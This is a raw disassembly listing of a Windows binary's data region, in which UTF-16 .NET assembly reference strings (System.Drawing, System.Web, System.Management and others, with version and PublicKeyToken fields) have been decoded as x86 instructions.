  40a112:	add    BYTE PTR gs:0x65006e00,bh
  40a119:	add    BYTE PTR [ebp+0x0],dh
  40a11c:	je     0x40a11e
  40a11e:	jb     0x40a120
  40a120:	popa   
  40a121:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a125:	add    BYTE PTR [eax],ah
  40a127:	add    BYTE PTR [eax+0x0],dl
  40a12a:	jne    0x40a12c
  40a12c:	bound  eax,QWORD PTR [eax]
  40a12e:	ins    BYTE PTR es:[edi],dx
  40a12f:	add    BYTE PTR [ecx+0x0],ch
  40a132:	arpl   WORD PTR [eax],ax
  40a134:	dec    ebx
  40a135:	add    BYTE PTR [ebp+0x0],ah
  40a138:	jns    0x40a13a
  40a13a:	push   esp
  40a13b:	add    BYTE PTR [edi+0x0],ch
  40a13e:	imul   eax,DWORD PTR [eax],0x65
  40a141:	add    BYTE PTR [esi+0x0],ch
  40a144:	cmp    eax,0x30006200
  40a149:	add    BYTE PTR [ebx],dh
  40a14b:	add    BYTE PTR [esi+0x0],ah
  40a14e:	xor    eax,0x37006600
  40a153:	add    BYTE PTR [esi+0x0],ah
  40a156:	xor    DWORD PTR [eax],eax
  40a158:	xor    DWORD PTR [eax],eax
  40a15a:	add    BYTE PTR fs:0x61003000,dh
  40a161:	add    BYTE PTR [ebx],dh
  40a163:	add    BYTE PTR [ecx+0x0],ah
  40a166:	xor    BYTE PTR [eax+0x790053],0x73
  40a16d:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a171:	add    BYTE PTR [ebp+0x0],ch
  40a174:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  40a179:	add    BYTE PTR [ecx+0x0],ah
  40a17c:	ja     0x40a17e
  40a17e:	imul   eax,DWORD PTR [eax],0x67006e
  40a184:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40a189:	add    BYTE PTR [ebx+0x0],dh
  40a18c:	imul   eax,DWORD PTR [eax],0x6e0067
  40a192:	sub    al,0x0
  40a194:	and    BYTE PTR [eax],al
  40a196:	push   esi
  40a197:	add    BYTE PTR [ebp+0x0],ah
  40a19a:	jb     0x40a19c
  40a19c:	jae    0x40a19e
  40a19e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a1a4:	cmp    eax,0x2e003200
  40a1a9:	add    BYTE PTR [eax],dh
  40a1ab:	add    BYTE PTR [esi],ch
  40a1ad:	add    BYTE PTR [eax],dh
  40a1af:	add    BYTE PTR [esi],ch
  40a1b1:	add    BYTE PTR [eax],dh
  40a1b3:	add    BYTE PTR [eax+eax*1],ch
  40a1b6:	and    BYTE PTR [eax],al
  40a1b8:	inc    ebx
  40a1b9:	add    BYTE PTR [ebp+0x0],dh
  40a1bc:	ins    BYTE PTR es:[edi],dx
  40a1bd:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a1c1:	add    BYTE PTR [edx+0x0],dh
  40a1c4:	add    BYTE PTR gs:0x65006e00,bh
  40a1cb:	add    BYTE PTR [ebp+0x0],dh
  40a1ce:	je     0x40a1d0
  40a1d0:	jb     0x40a1d2
  40a1d2:	popa   
  40a1d3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a1d7:	add    BYTE PTR [eax],ah
  40a1d9:	add    BYTE PTR [eax+0x0],dl
  40a1dc:	jne    0x40a1de
  40a1de:	bound  eax,QWORD PTR [eax]
  40a1e0:	ins    BYTE PTR es:[edi],dx
  40a1e1:	add    BYTE PTR [ecx+0x0],ch
  40a1e4:	arpl   WORD PTR [eax],ax
  40a1e6:	dec    ebx
  40a1e7:	add    BYTE PTR [ebp+0x0],ah
  40a1ea:	jns    0x40a1ec
  40a1ec:	push   esp
  40a1ed:	add    BYTE PTR [edi+0x0],ch
  40a1f0:	imul   eax,DWORD PTR [eax],0x65
  40a1f3:	add    BYTE PTR [esi+0x0],ch
  40a1f6:	cmp    eax,0x30006200
  40a1fb:	add    BYTE PTR [ebx],dh
  40a1fd:	add    BYTE PTR [esi+0x0],ah
  40a200:	xor    eax,0x37006600
  40a205:	add    BYTE PTR [esi+0x0],ah
  40a208:	xor    DWORD PTR [eax],eax
  40a20a:	xor    DWORD PTR [eax],eax
  40a20c:	add    BYTE PTR fs:0x61003000,dh
  40a213:	add    BYTE PTR [ebx],dh
  40a215:	add    BYTE PTR [ecx+0x0],ah
  40a218:	and    BYTE PTR [edx+0x790053],0x73
  40a21f:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a223:	add    BYTE PTR [ebp+0x0],ch
  40a226:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  40a22b:	add    BYTE PTR [ecx+0x0],ah
  40a22e:	ja     0x40a230
  40a230:	imul   eax,DWORD PTR [eax],0x67006e
  40a236:	sub    al,0x0
  40a238:	and    BYTE PTR [eax],al
  40a23a:	push   esi
  40a23b:	add    BYTE PTR [ebp+0x0],ah
  40a23e:	jb     0x40a240
  40a240:	jae    0x40a242
  40a242:	imul   eax,DWORD PTR [eax],0x6e006f
  40a248:	cmp    eax,0x2e003200
  40a24d:	add    BYTE PTR [eax],dh
  40a24f:	add    BYTE PTR [esi],ch
  40a251:	add    BYTE PTR [eax],dh
  40a253:	add    BYTE PTR [esi],ch
  40a255:	add    BYTE PTR [eax],dh
  40a257:	add    BYTE PTR [eax+eax*1],ch
  40a25a:	and    BYTE PTR [eax],al
  40a25c:	inc    ebx
  40a25d:	add    BYTE PTR [ebp+0x0],dh
  40a260:	ins    BYTE PTR es:[edi],dx
  40a261:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a265:	add    BYTE PTR [edx+0x0],dh
  40a268:	add    BYTE PTR gs:0x65006e00,bh
  40a26f:	add    BYTE PTR [ebp+0x0],dh
  40a272:	je     0x40a274
  40a274:	jb     0x40a276
  40a276:	popa   
  40a277:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a27b:	add    BYTE PTR [eax],ah
  40a27d:	add    BYTE PTR [eax+0x0],dl
  40a280:	jne    0x40a282
  40a282:	bound  eax,QWORD PTR [eax]
  40a284:	ins    BYTE PTR es:[edi],dx
  40a285:	add    BYTE PTR [ecx+0x0],ch
  40a288:	arpl   WORD PTR [eax],ax
  40a28a:	dec    ebx
  40a28b:	add    BYTE PTR [ebp+0x0],ah
  40a28e:	jns    0x40a290
  40a290:	push   esp
  40a291:	add    BYTE PTR [edi+0x0],ch
  40a294:	imul   eax,DWORD PTR [eax],0x65
  40a297:	add    BYTE PTR [esi+0x0],ch
  40a29a:	cmp    eax,0x30006200
  40a29f:	add    BYTE PTR [ebx],dh
  40a2a1:	add    BYTE PTR [esi+0x0],ah
  40a2a4:	xor    eax,0x37006600
  40a2a9:	add    BYTE PTR [esi+0x0],ah
  40a2ac:	xor    DWORD PTR [eax],eax
  40a2ae:	xor    DWORD PTR [eax],eax
  40a2b0:	add    BYTE PTR fs:0x61003000,dh
  40a2b7:	add    BYTE PTR [ebx],dh
  40a2b9:	add    BYTE PTR [ecx+0x0],ah
  40a2bc:	cmp    BYTE PTR [eax+0x790053],0x73
  40a2c3:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a2c7:	add    BYTE PTR [ebp+0x0],ch
  40a2ca:	add    BYTE PTR cs:[ebp+0x0],al
  40a2ce:	outs   dx,BYTE PTR ds:[esi]
  40a2cf:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a2d3:	add    BYTE PTR [edx+0x0],dh
  40a2d6:	jo     0x40a2d8
  40a2d8:	jb     0x40a2da
  40a2da:	imul   eax,DWORD PTR [eax],0x650073
  40a2e0:	push   ebx
  40a2e1:	add    BYTE PTR [ebp+0x0],ah
  40a2e4:	jb     0x40a2e6
  40a2e6:	jbe    0x40a2e8
  40a2e8:	imul   eax,DWORD PTR [eax],0x650063
  40a2ee:	jae    0x40a2f0
  40a2f0:	sub    al,0x0
  40a2f2:	and    BYTE PTR [eax],al
  40a2f4:	push   esi
  40a2f5:	add    BYTE PTR [ebp+0x0],ah
  40a2f8:	jb     0x40a2fa
  40a2fa:	jae    0x40a2fc
  40a2fc:	imul   eax,DWORD PTR [eax],0x6e006f
  40a302:	cmp    eax,0x2e003200
  40a307:	add    BYTE PTR [eax],dh
  40a309:	add    BYTE PTR [esi],ch
  40a30b:	add    BYTE PTR [eax],dh
  40a30d:	add    BYTE PTR [esi],ch
  40a30f:	add    BYTE PTR [eax],dh
  40a311:	add    BYTE PTR [eax+eax*1],ch
  40a314:	and    BYTE PTR [eax],al
  40a316:	inc    ebx
  40a317:	add    BYTE PTR [ebp+0x0],dh
  40a31a:	ins    BYTE PTR es:[edi],dx
  40a31b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a31f:	add    BYTE PTR [edx+0x0],dh
  40a322:	add    BYTE PTR gs:0x65006e00,bh
  40a329:	add    BYTE PTR [ebp+0x0],dh
  40a32c:	je     0x40a32e
  40a32e:	jb     0x40a330
  40a330:	popa   
  40a331:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a335:	add    BYTE PTR [eax],ah
  40a337:	add    BYTE PTR [eax+0x0],dl
  40a33a:	jne    0x40a33c
  40a33c:	bound  eax,QWORD PTR [eax]
  40a33e:	ins    BYTE PTR es:[edi],dx
  40a33f:	add    BYTE PTR [ecx+0x0],ch
  40a342:	arpl   WORD PTR [eax],ax
  40a344:	dec    ebx
  40a345:	add    BYTE PTR [ebp+0x0],ah
  40a348:	jns    0x40a34a
  40a34a:	push   esp
  40a34b:	add    BYTE PTR [edi+0x0],ch
  40a34e:	imul   eax,DWORD PTR [eax],0x65
  40a351:	add    BYTE PTR [esi+0x0],ch
  40a354:	cmp    eax,0x30006200
  40a359:	add    BYTE PTR [ebx],dh
  40a35b:	add    BYTE PTR [esi+0x0],ah
  40a35e:	xor    eax,0x37006600
  40a363:	add    BYTE PTR [esi+0x0],ah
  40a366:	xor    DWORD PTR [eax],eax
  40a368:	xor    DWORD PTR [eax],eax
  40a36a:	add    BYTE PTR fs:0x61003000,dh
  40a371:	add    BYTE PTR [ebx],dh
  40a373:	add    BYTE PTR [ecx+0x0],ah
  40a376:	sub    BYTE PTR [eax+0x790053],0x73
  40a37d:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a381:	add    BYTE PTR [ebp+0x0],ch
  40a384:	add    BYTE PTR cs:[ebp+0x0],cl
  40a388:	popa   
  40a389:	add    BYTE PTR [esi+0x0],ch
  40a38c:	popa   
  40a38d:	add    BYTE PTR [edi+0x0],ah
  40a390:	add    BYTE PTR gs:[ebp+0x0],ch
  40a394:	add    BYTE PTR gs:[esi+0x0],ch
  40a398:	je     0x40a39a
  40a39a:	sub    al,0x0
  40a39c:	and    BYTE PTR [eax],al
  40a39e:	push   esi
  40a39f:	add    BYTE PTR [ebp+0x0],ah
  40a3a2:	jb     0x40a3a4
  40a3a4:	jae    0x40a3a6
  40a3a6:	imul   eax,DWORD PTR [eax],0x6e006f
  40a3ac:	cmp    eax,0x2e003200
  40a3b1:	add    BYTE PTR [eax],dh
  40a3b3:	add    BYTE PTR [esi],ch
  40a3b5:	add    BYTE PTR [eax],dh
  40a3b7:	add    BYTE PTR [esi],ch
  40a3b9:	add    BYTE PTR [eax],dh
  40a3bb:	add    BYTE PTR [eax+eax*1],ch
  40a3be:	and    BYTE PTR [eax],al
  40a3c0:	inc    ebx
  40a3c1:	add    BYTE PTR [ebp+0x0],dh
  40a3c4:	ins    BYTE PTR es:[edi],dx
  40a3c5:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a3c9:	add    BYTE PTR [edx+0x0],dh
  40a3cc:	add    BYTE PTR gs:0x65006e00,bh
  40a3d3:	add    BYTE PTR [ebp+0x0],dh
  40a3d6:	je     0x40a3d8
  40a3d8:	jb     0x40a3da
  40a3da:	popa   
  40a3db:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a3df:	add    BYTE PTR [eax],ah
  40a3e1:	add    BYTE PTR [eax+0x0],dl
  40a3e4:	jne    0x40a3e6
  40a3e6:	bound  eax,QWORD PTR [eax]
  40a3e8:	ins    BYTE PTR es:[edi],dx
  40a3e9:	add    BYTE PTR [ecx+0x0],ch
  40a3ec:	arpl   WORD PTR [eax],ax
  40a3ee:	dec    ebx
  40a3ef:	add    BYTE PTR [ebp+0x0],ah
  40a3f2:	jns    0x40a3f4
  40a3f4:	push   esp
  40a3f5:	add    BYTE PTR [edi+0x0],ch
  40a3f8:	imul   eax,DWORD PTR [eax],0x65
  40a3fb:	add    BYTE PTR [esi+0x0],ch
  40a3fe:	cmp    eax,0x30006200
  40a403:	add    BYTE PTR [ebx],dh
  40a405:	add    BYTE PTR [esi+0x0],ah
  40a408:	xor    eax,0x37006600
  40a40d:	add    BYTE PTR [esi+0x0],ah
  40a410:	xor    DWORD PTR [eax],eax
  40a412:	xor    DWORD PTR [eax],eax
  40a414:	add    BYTE PTR fs:0x61003000,dh
  40a41b:	add    BYTE PTR [ebx],dh
  40a41d:	add    BYTE PTR [ecx+0x0],ah
  40a420:	and    BYTE PTR [esi+0x790053],0x73
  40a427:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a42b:	add    BYTE PTR [ebp+0x0],ch
  40a42e:	add    BYTE PTR cs:[ebp+0x0],cl
  40a432:	add    BYTE PTR gs:[ebx+0x0],dh
  40a436:	jae    0x40a438
  40a438:	popa   
  40a439:	add    BYTE PTR [edi+0x0],ah
  40a43c:	imul   eax,DWORD PTR [eax],0x67006e
  40a442:	sub    al,0x0
  40a444:	and    BYTE PTR [eax],al
  40a446:	push   esi
  40a447:	add    BYTE PTR [ebp+0x0],ah
  40a44a:	jb     0x40a44c
  40a44c:	jae    0x40a44e
  40a44e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a454:	cmp    eax,0x2e003200
  40a459:	add    BYTE PTR [eax],dh
  40a45b:	add    BYTE PTR [esi],ch
  40a45d:	add    BYTE PTR [eax],dh
  40a45f:	add    BYTE PTR [esi],ch
  40a461:	add    BYTE PTR [eax],dh
  40a463:	add    BYTE PTR [eax+eax*1],ch
  40a466:	and    BYTE PTR [eax],al
  40a468:	inc    ebx
  40a469:	add    BYTE PTR [ebp+0x0],dh
  40a46c:	ins    BYTE PTR es:[edi],dx
  40a46d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a471:	add    BYTE PTR [edx+0x0],dh
  40a474:	add    BYTE PTR gs:0x65006e00,bh
  40a47b:	add    BYTE PTR [ebp+0x0],dh
  40a47e:	je     0x40a480
  40a480:	jb     0x40a482
  40a482:	popa   
  40a483:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a487:	add    BYTE PTR [eax],ah
  40a489:	add    BYTE PTR [eax+0x0],dl
  40a48c:	jne    0x40a48e
  40a48e:	bound  eax,QWORD PTR [eax]
  40a490:	ins    BYTE PTR es:[edi],dx
  40a491:	add    BYTE PTR [ecx+0x0],ch
  40a494:	arpl   WORD PTR [eax],ax
  40a496:	dec    ebx
  40a497:	add    BYTE PTR [ebp+0x0],ah
  40a49a:	jns    0x40a49c
  40a49c:	push   esp
  40a49d:	add    BYTE PTR [edi+0x0],ch
  40a4a0:	imul   eax,DWORD PTR [eax],0x65
  40a4a3:	add    BYTE PTR [esi+0x0],ch
  40a4a6:	cmp    eax,0x30006200
  40a4ab:	add    BYTE PTR [ebx],dh
  40a4ad:	add    BYTE PTR [esi+0x0],ah
  40a4b0:	xor    eax,0x37006600
  40a4b5:	add    BYTE PTR [esi+0x0],ah
  40a4b8:	xor    DWORD PTR [eax],eax
  40a4ba:	xor    DWORD PTR [eax],eax
  40a4bc:	add    BYTE PTR fs:0x61003000,dh
  40a4c3:	add    BYTE PTR [ebx],dh
  40a4c5:	add    BYTE PTR [ecx+0x0],ah
  40a4c8:	sbb    dh,0x53
  40a4cb:	add    BYTE PTR [ecx+0x0],bh
  40a4ce:	jae    0x40a4d0
  40a4d0:	je     0x40a4d2
  40a4d2:	add    BYTE PTR gs:[ebp+0x0],ch
  40a4d6:	add    BYTE PTR cs:[edx+0x0],dl
  40a4da:	jne    0x40a4dc
  40a4dc:	outs   dx,BYTE PTR ds:[esi]
  40a4dd:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a4e1:	add    BYTE PTR [ebp+0x0],ch
  40a4e4:	add    BYTE PTR gs:[esi],ch
  40a4e7:	add    BYTE PTR [ebx+0x0],dl
  40a4ea:	add    BYTE PTR gs:[edx+0x0],dh
  40a4ee:	imul   eax,DWORD PTR [eax],0x6c0061
  40a4f4:	imul   eax,DWORD PTR [eax],0x61007a
  40a4fa:	je     0x40a4fc
  40a4fc:	imul   eax,DWORD PTR [eax],0x6e006f
  40a502:	add    BYTE PTR cs:[esi+0x0],al
  40a506:	outs   dx,DWORD PTR ds:[esi]
  40a507:	add    BYTE PTR [edx+0x0],dh
  40a50a:	ins    DWORD PTR es:[edi],dx
  40a50b:	add    BYTE PTR [ecx+0x0],ah
  40a50e:	je     0x40a510
  40a510:	je     0x40a512
  40a512:	add    BYTE PTR gs:[edx+0x0],dh
  40a516:	jae    0x40a518
  40a518:	add    BYTE PTR cs:[ebx+0x0],dl
  40a51c:	outs   dx,DWORD PTR ds:[esi]
  40a51d:	add    BYTE PTR [ecx+0x0],ah
  40a520:	jo     0x40a522
  40a522:	sub    al,0x0
  40a524:	and    BYTE PTR [eax],al
  40a526:	push   esi
  40a527:	add    BYTE PTR [ebp+0x0],ah
  40a52a:	jb     0x40a52c
  40a52c:	jae    0x40a52e
  40a52e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a534:	cmp    eax,0x2e003200
  40a539:	add    BYTE PTR [eax],dh
  40a53b:	add    BYTE PTR [esi],ch
  40a53d:	add    BYTE PTR [eax],dh
  40a53f:	add    BYTE PTR [esi],ch
  40a541:	add    BYTE PTR [eax],dh
  40a543:	add    BYTE PTR [eax+eax*1],ch
  40a546:	and    BYTE PTR [eax],al
  40a548:	inc    ebx
  40a549:	add    BYTE PTR [ebp+0x0],dh
  40a54c:	ins    BYTE PTR es:[edi],dx
  40a54d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a551:	add    BYTE PTR [edx+0x0],dh
  40a554:	add    BYTE PTR gs:0x65006e00,bh
  40a55b:	add    BYTE PTR [ebp+0x0],dh
  40a55e:	je     0x40a560
  40a560:	jb     0x40a562
  40a562:	popa   
  40a563:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a567:	add    BYTE PTR [eax],ah
  40a569:	add    BYTE PTR [eax+0x0],dl
  40a56c:	jne    0x40a56e
  40a56e:	bound  eax,QWORD PTR [eax]
  40a570:	ins    BYTE PTR es:[edi],dx
  40a571:	add    BYTE PTR [ecx+0x0],ch
  40a574:	arpl   WORD PTR [eax],ax
  40a576:	dec    ebx
  40a577:	add    BYTE PTR [ebp+0x0],ah
  40a57a:	jns    0x40a57c
  40a57c:	push   esp
  40a57d:	add    BYTE PTR [edi+0x0],ch
  40a580:	imul   eax,DWORD PTR [eax],0x65
  40a583:	add    BYTE PTR [esi+0x0],ch
  40a586:	cmp    eax,0x30006200
  40a58b:	add    BYTE PTR [ebx],dh
  40a58d:	add    BYTE PTR [esi+0x0],ah
  40a590:	xor    eax,0x37006600
  40a595:	add    BYTE PTR [esi+0x0],ah
  40a598:	xor    DWORD PTR [eax],eax
  40a59a:	xor    DWORD PTR [eax],eax
  40a59c:	add    BYTE PTR fs:0x61003000,dh
  40a5a3:	add    BYTE PTR [ebx],dh
  40a5a5:	add    BYTE PTR [ecx+0x0],ah
  40a5a8:	and    BYTE PTR [ebx+edx*2+0x73007900],0x0
  40a5b0:	je     0x40a5b2
  40a5b2:	add    BYTE PTR gs:[ebp+0x0],ch
  40a5b6:	add    BYTE PTR cs:[ebx+0x0],dl
  40a5ba:	add    BYTE PTR gs:[ebx+0x0],ah
  40a5be:	jne    0x40a5c0
  40a5c0:	jb     0x40a5c2
  40a5c2:	imul   eax,DWORD PTR [eax],0x790074
  40a5c8:	sub    al,0x0
  40a5ca:	and    BYTE PTR [eax],al
  40a5cc:	push   esi
  40a5cd:	add    BYTE PTR [ebp+0x0],ah
  40a5d0:	jb     0x40a5d2
  40a5d2:	jae    0x40a5d4
  40a5d4:	imul   eax,DWORD PTR [eax],0x6e006f
  40a5da:	cmp    eax,0x2e003200
  40a5df:	add    BYTE PTR [eax],dh
  40a5e1:	add    BYTE PTR [esi],ch
  40a5e3:	add    BYTE PTR [eax],dh
  40a5e5:	add    BYTE PTR [esi],ch
  40a5e7:	add    BYTE PTR [eax],dh
  40a5e9:	add    BYTE PTR [eax+eax*1],ch
  40a5ec:	and    BYTE PTR [eax],al
  40a5ee:	inc    ebx
  40a5ef:	add    BYTE PTR [ebp+0x0],dh
  40a5f2:	ins    BYTE PTR es:[edi],dx
  40a5f3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a5f7:	add    BYTE PTR [edx+0x0],dh
  40a5fa:	add    BYTE PTR gs:0x65006e00,bh
  40a601:	add    BYTE PTR [ebp+0x0],dh
  40a604:	je     0x40a606
  40a606:	jb     0x40a608
  40a608:	popa   
  40a609:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a60d:	add    BYTE PTR [eax],ah
  40a60f:	add    BYTE PTR [eax+0x0],dl
  40a612:	jne    0x40a614
  40a614:	bound  eax,QWORD PTR [eax]
  40a616:	ins    BYTE PTR es:[edi],dx
  40a617:	add    BYTE PTR [ecx+0x0],ch
  40a61a:	arpl   WORD PTR [eax],ax
  40a61c:	dec    ebx
  40a61d:	add    BYTE PTR [ebp+0x0],ah
  40a620:	jns    0x40a622
  40a622:	push   esp
  40a623:	add    BYTE PTR [edi+0x0],ch
  40a626:	imul   eax,DWORD PTR [eax],0x65
  40a629:	add    BYTE PTR [esi+0x0],ch
  40a62c:	cmp    eax,0x30006200
  40a631:	add    BYTE PTR [ebx],dh
  40a633:	add    BYTE PTR [esi+0x0],ah
  40a636:	xor    eax,0x37006600
  40a63b:	add    BYTE PTR [esi+0x0],ah
  40a63e:	xor    DWORD PTR [eax],eax
  40a640:	xor    DWORD PTR [eax],eax
  40a642:	add    BYTE PTR fs:0x61003000,dh
  40a649:	add    BYTE PTR [ebx],dh
  40a64b:	add    BYTE PTR [ecx+0x0],ah
  40a64e:	xor    BYTE PTR [eax+0x790053],0x73
  40a655:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a659:	add    BYTE PTR [ebp+0x0],ch
  40a65c:	add    BYTE PTR cs:[ebx+0x0],dl
  40a660:	add    BYTE PTR gs:[edx+0x0],dh
  40a664:	jbe    0x40a666
  40a666:	imul   eax,DWORD PTR [eax],0x650063
  40a66c:	push   eax
  40a66d:	add    BYTE PTR [edx+0x0],dh
  40a670:	outs   dx,DWORD PTR ds:[esi]
  40a671:	add    BYTE PTR [ebx+0x0],ah
  40a674:	add    BYTE PTR gs:[ebx+0x0],dh
  40a678:	jae    0x40a67a
  40a67a:	sub    al,0x0
  40a67c:	and    BYTE PTR [eax],al
  40a67e:	push   esi
  40a67f:	add    BYTE PTR [ebp+0x0],ah
  40a682:	jb     0x40a684
  40a684:	jae    0x40a686
  40a686:	imul   eax,DWORD PTR [eax],0x6e006f
  40a68c:	cmp    eax,0x2e003200
  40a691:	add    BYTE PTR [eax],dh
  40a693:	add    BYTE PTR [esi],ch
  40a695:	add    BYTE PTR [eax],dh
  40a697:	add    BYTE PTR [esi],ch
  40a699:	add    BYTE PTR [eax],dh
  40a69b:	add    BYTE PTR [eax+eax*1],ch
  40a69e:	and    BYTE PTR [eax],al
  40a6a0:	inc    ebx
  40a6a1:	add    BYTE PTR [ebp+0x0],dh
  40a6a4:	ins    BYTE PTR es:[edi],dx
  40a6a5:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a6a9:	add    BYTE PTR [edx+0x0],dh
  40a6ac:	add    BYTE PTR gs:0x65006e00,bh
  40a6b3:	add    BYTE PTR [ebp+0x0],dh
  40a6b6:	je     0x40a6b8
  40a6b8:	jb     0x40a6ba
  40a6ba:	popa   
  40a6bb:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a6bf:	add    BYTE PTR [eax],ah
  40a6c1:	add    BYTE PTR [eax+0x0],dl
  40a6c4:	jne    0x40a6c6
  40a6c6:	bound  eax,QWORD PTR [eax]
  40a6c8:	ins    BYTE PTR es:[edi],dx
  40a6c9:	add    BYTE PTR [ecx+0x0],ch
  40a6cc:	arpl   WORD PTR [eax],ax
  40a6ce:	dec    ebx
  40a6cf:	add    BYTE PTR [ebp+0x0],ah
  40a6d2:	jns    0x40a6d4
  40a6d4:	push   esp
  40a6d5:	add    BYTE PTR [edi+0x0],ch
  40a6d8:	imul   eax,DWORD PTR [eax],0x65
  40a6db:	add    BYTE PTR [esi+0x0],ch
  40a6de:	cmp    eax,0x30006200
  40a6e3:	add    BYTE PTR [ebx],dh
  40a6e5:	add    BYTE PTR [esi+0x0],ah
  40a6e8:	xor    eax,0x37006600
  40a6ed:	add    BYTE PTR [esi+0x0],ah
  40a6f0:	xor    DWORD PTR [eax],eax
  40a6f2:	xor    DWORD PTR [eax],eax
  40a6f4:	add    BYTE PTR fs:0x61003000,dh
  40a6fb:	add    BYTE PTR [ebx],dh
  40a6fd:	add    BYTE PTR [ecx+0x0],ah
  40a700:	sbb    BYTE PTR [edx+0x790053],0x73
  40a707:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a70b:	add    BYTE PTR [ebp+0x0],ch
  40a70e:	add    BYTE PTR cs:[edi+0x0],dl
  40a712:	add    BYTE PTR gs:[edx+0x0],ah
  40a716:	sub    al,0x0
  40a718:	and    BYTE PTR [eax],al
  40a71a:	push   esi
  40a71b:	add    BYTE PTR [ebp+0x0],ah
  40a71e:	jb     0x40a720
  40a720:	jae    0x40a722
  40a722:	imul   eax,DWORD PTR [eax],0x6e006f
  40a728:	cmp    eax,0x2e003200
  40a72d:	add    BYTE PTR [eax],dh
  40a72f:	add    BYTE PTR [esi],ch
  40a731:	add    BYTE PTR [eax],dh
  40a733:	add    BYTE PTR [esi],ch
  40a735:	add    BYTE PTR [eax],dh
  40a737:	add    BYTE PTR [eax+eax*1],ch
  40a73a:	and    BYTE PTR [eax],al
  40a73c:	inc    ebx
  40a73d:	add    BYTE PTR [ebp+0x0],dh
  40a740:	ins    BYTE PTR es:[edi],dx
  40a741:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a745:	add    BYTE PTR [edx+0x0],dh
  40a748:	add    BYTE PTR gs:0x65006e00,bh
  40a74f:	add    BYTE PTR [ebp+0x0],dh
  40a752:	je     0x40a754
  40a754:	jb     0x40a756
  40a756:	popa   
  40a757:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a75b:	add    BYTE PTR [eax],ah
  40a75d:	add    BYTE PTR [eax+0x0],dl
  40a760:	jne    0x40a762
  40a762:	bound  eax,QWORD PTR [eax]
  40a764:	ins    BYTE PTR es:[edi],dx
  40a765:	add    BYTE PTR [ecx+0x0],ch
  40a768:	arpl   WORD PTR [eax],ax
  40a76a:	dec    ebx
  40a76b:	add    BYTE PTR [ebp+0x0],ah
  40a76e:	jns    0x40a770
  40a770:	push   esp
  40a771:	add    BYTE PTR [edi+0x0],ch
  40a774:	imul   eax,DWORD PTR [eax],0x65
  40a777:	add    BYTE PTR [esi+0x0],ch
  40a77a:	cmp    eax,0x30006200
  40a77f:	add    BYTE PTR [ebx],dh
  40a781:	add    BYTE PTR [esi+0x0],ah
  40a784:	xor    eax,0x37006600
  40a789:	add    BYTE PTR [esi+0x0],ah
  40a78c:	xor    DWORD PTR [eax],eax
  40a78e:	xor    DWORD PTR [eax],eax
  40a790:	add    BYTE PTR fs:0x61003000,dh
  40a797:	add    BYTE PTR [ebx],dh
  40a799:	add    BYTE PTR [ecx+0x0],ah
  40a79c:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  40a7a4:	je     0x40a7a6
  40a7a6:	add    BYTE PTR gs:[ebp+0x0],ch
  40a7aa:	add    BYTE PTR cs:[edi+0x0],dl
  40a7ae:	add    BYTE PTR gs:[edx+0x0],ah
  40a7b2:	add    BYTE PTR cs:[ecx+0x0],al
  40a7b6:	bound  eax,QWORD PTR [eax]
  40a7b8:	jae    0x40a7ba
  40a7ba:	je     0x40a7bc
  40a7bc:	jb     0x40a7be
  40a7be:	popa   
  40a7bf:	add    BYTE PTR [ebx+0x0],ah
  40a7c2:	je     0x40a7c4
  40a7c4:	imul   eax,DWORD PTR [eax],0x6e006f
  40a7ca:	jae    0x40a7cc
  40a7cc:	sub    al,0x0
  40a7ce:	and    BYTE PTR [eax],al
  40a7d0:	push   esi
  40a7d1:	add    BYTE PTR [ebp+0x0],ah
  40a7d4:	jb     0x40a7d6
  40a7d6:	jae    0x40a7d8
  40a7d8:	imul   eax,DWORD PTR [eax],0x6e006f
  40a7de:	cmp    eax,0x2e003300
  40a7e3:	add    BYTE PTR ds:0x30002e00,dh
  40a7e9:	add    BYTE PTR [esi],ch
  40a7eb:	add    BYTE PTR [eax],dh
  40a7ed:	add    BYTE PTR [eax+eax*1],ch
  40a7f0:	and    BYTE PTR [eax],al
  40a7f2:	inc    ebx
  40a7f3:	add    BYTE PTR [ebp+0x0],dh
  40a7f6:	ins    BYTE PTR es:[edi],dx
  40a7f7:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a7fb:	add    BYTE PTR [edx+0x0],dh
  40a7fe:	add    BYTE PTR gs:0x65006e00,bh
  40a805:	add    BYTE PTR [ebp+0x0],dh
  40a808:	je     0x40a80a
  40a80a:	jb     0x40a80c
  40a80c:	popa   
  40a80d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a811:	add    BYTE PTR [eax],ah
  40a813:	add    BYTE PTR [eax+0x0],dl
  40a816:	jne    0x40a818
  40a818:	bound  eax,QWORD PTR [eax]
  40a81a:	ins    BYTE PTR es:[edi],dx
  40a81b:	add    BYTE PTR [ecx+0x0],ch
